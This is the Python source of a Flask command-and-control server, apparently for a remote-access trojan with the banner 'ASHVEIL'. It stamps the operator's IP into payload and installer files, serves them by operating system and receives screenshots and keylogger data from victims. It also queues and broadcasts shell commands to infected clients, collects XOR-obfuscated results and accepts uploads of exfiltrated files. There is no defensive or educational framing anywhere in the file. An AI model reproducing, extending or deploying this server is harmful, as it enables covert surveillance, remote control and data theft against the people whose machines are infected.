from flask import Flask, request, send_file, send_from_directory, jsonify, Response, render_template, abort
import os
import time
from blessed import Terminal
import socket
import signal
import atexit
import requests

app = Flask(__name__)

# === Paths and Global Config ===
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
INSTALLER_DIR = os.path.join(CURRENT_DIR, "installers")
UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
SCREENSHOTS_DIR = os.path.join(CURRENT_DIR, "screenshots")

os.makedirs(CODE_DIR, exist_ok=True)
os.makedirs(INSTALLER_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

selected_code_file = None
forwarded = False
port = 7777

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=text")
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        return f"Error: {e}"

# === Helper Functions ===
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def info(message=""):
    clear_screen()
    print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
    print(" ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
    print(" ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
    print(" ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
    print(" ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
    print(" ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
    if message:
        print(f"\n==========  {message}  =========\n")
    time.sleep(0.5)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def adjust_payloads():
    ip = get_public_ip() if forwarded else "127.0.0.1"
    for directory in [CODE_DIR, INSTALLER_DIR]:
        for fname in os.listdir(directory):
            fpath = os.path.join(directory, fname)
            if os.path.isfile(fpath):
                try:
                    with open(fpath, 'r', encoding='utf-8') as f:
                        content = f.read()
                    new_content = content.replace("URL_PLACEHOLDER", f"http://{ip}:{port}")
                    with open(fpath, 'w', encoding='utf-8') as f:
                        f.write(new_content)
                    print(f"[+] Adjusted {fname} with {ip}")
                except Exception as e:
                    print(f"[!] Failed to adjust {fname}: {e}")

def revert_payloads():
    ip = get_public_ip() if forwarded else "127.0.0.1"
    for directory in [CODE_DIR, INSTALLER_DIR]:
        for fname in os.listdir(directory):
            fpath = os.path.join(directory, fname)
            if os.path.isfile(fpath):
                try:
                    with open(fpath, 'r', encoding='utf-8') as f:
                        content = f.read()
                    new_content = content.replace(f"http://{ip}:{port}", "URL_PLACEHOLDER")
                    with open(fpath, 'w', encoding='utf-8') as f:
                        f.write(new_content)
                    print(f"[+] Reverted {fname}")
                except Exception as e:
                    print(f"[!] Failed to revert {fname}: {e}")

def handle_shutdown(signum, frame):
    print("\n[*] Shutting down. Cleaning up...")
    revert_payloads()
    info("Hope to see you again soon :)")
    exit(0)

signal.signal(signal.SIGINT, handle_shutdown)
signal.signal(signal.SIGTERM, handle_shutdown)
atexit.register(revert_payloads)

def ask_if_forwarded():
    global forwarded
    term = Terminal()
    options = ["Yes", "No", "Exit"]
    idx = 0

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        while True:
            print(term.clear + term.move_yx(0, 0) + term.bold("Do you have a forwarded port (7777)?\n"))
            for i, option in enumerate(options):
                print(term.reverse(option) if i == idx else option)
            key = term.inkey()
            if key.name == "KEY_UP":
                idx = (idx - 1) % len(options)
            elif key.name == "KEY_DOWN":
                idx = (idx + 1) % len(options)
            elif key.name in ("KEY_ENTER", "\n"):
                if options[idx] == "Exit":
                    print("Exiting.")
                    exit(0)
                forwarded = options[idx] == "Yes"
                break

def choose_code_file():
    global selected_code_file
    files = os.listdir(CODE_DIR)
    if not files:
        print("[!] No payload files found in payloads/")
        exit(1)
    term = Terminal()
    idx = 0
    files += ["[Exit]"]

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        while True:
            print(term.clear + term.bold("Select a payload:\n"))
            for i, f in enumerate(files):
                print(term.reverse(f) if i == idx else f)
            key = term.inkey()
            if key.name == "KEY_UP":
                idx = (idx - 1) % len(files)
            elif key.name == "KEY_DOWN":
                idx = (idx + 1) % len(files)
            elif key.name in ("KEY_ENTER", "\n"):
                if files[idx] == "[Exit]":
                    exit(0)
                selected_code_file = files[idx]
                print(f"[+] Selected: {selected_code_file}")
                time.sleep(1)
                break

# === XOR Helper ===
def xor(data, key="nullbeacon"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# === Flask Routes ===
clients = {}
current_cmd = ""
last_result = ""

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")

@app.route("/documentation/payloads")
def payloads_doc():
    if not selected_code_file:
        return "No payload selected"
    stripped = selected_code_file.split('.')[0]
    return render_template("payloads.html", payload=stripped)

@app.route("/upload", methods=["POST"])
def upload_screenshot():
    file = request.files.get("file")
    if file:
        filename = f"screenshot_{int(time.time())}.jpg"
        file.save(os.path.join(SCREENSHOTS_DIR, filename))
        return "OK"
    return "No file", 400

@app.route("/code")
def serve_code():
    if not selected_code_file:
        return "No code file selected.", 500
    try:
        with open(os.path.join(CODE_DIR, selected_code_file), "r", encoding="utf-8") as f:
            return Response(f.read(), mimetype="text/plain")
    except Exception as e:
        return f"Error: {e}", 500

@app.route("/install")
def install():
    ua = request.headers.get("User-Agent", "").lower()
    script = "installer/install.ps1" if "windows" in ua else "installers/install.sh"
    path = os.path.join(CURRENT_DIR, script)
    return send_file(path, as_attachment=True) if os.path.exists(path) else abort(404)

@app.route("/clean")
def clean():
    path = os.path.join(CURRENT_DIR, "clean.bat")
    return send_from_directory(CURRENT_DIR, "clean.bat", as_attachment=True) if os.path.exists(path) else abort(404)

@app.route("/log", methods=["POST"])
def log():
    raw = request.form.get("data", "")
    with open("keylog.log", "a", encoding="utf-8") as f:
        f.write(raw)
    return "OK"

@app.route("/client_info", methods=["POST"])
def update_client_info():
    cid = request.data.decode()
    clients[cid] = {"ip": request.remote_addr, "last_seen": time.time()}
    print(f"[+] Client {cid} from {request.remote_addr}")
    return "OK"

@app.route("/get")
def get_command():
    return current_cmd

@app.route("/set", methods=["POST"])
def set_command():
    global current_cmd
    current_cmd = request.data.decode()
    return "OK"

@app.route("/result", methods=["POST"])
def result():
    global last_result
    last_result = xor(request.data.decode())
    return "OK"

@app.route("/last")
def last():
    return last_result or "[*] No result yet."

@app.route("/upload_file", methods=["POST"])
def upload_file():
    file = request.files.get("file")
    if file:
        file.save(os.path.join(UPLOAD_DIR, file.filename))
        return "OK"
    return "No file", 400

@app.route("/download/<filename>")
def download(filename):
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)

@app.route("/broadcast", methods=["POST"])
def broadcast():
    global current_cmd
    current_cmd = request.data.decode()
    print(f"[!] Broadcast: {current_cmd}")
    return "OK"

@app.route("/spread", methods=["POST"])
def spread():
    print("[*] Spread called")
    return "OK"

@app.route("/clients")
def list_clients():
    return jsonify(list(clients.keys()))

# === Main Runner ===
if __name__ == "__main__":
    ask_if_forwarded()
    info("Adjusting payloads...")
    adjust_payloads()
    choose_code_file()
    info("Starting C2 Server")
    app.run(host="0.0.0.0", port=port)
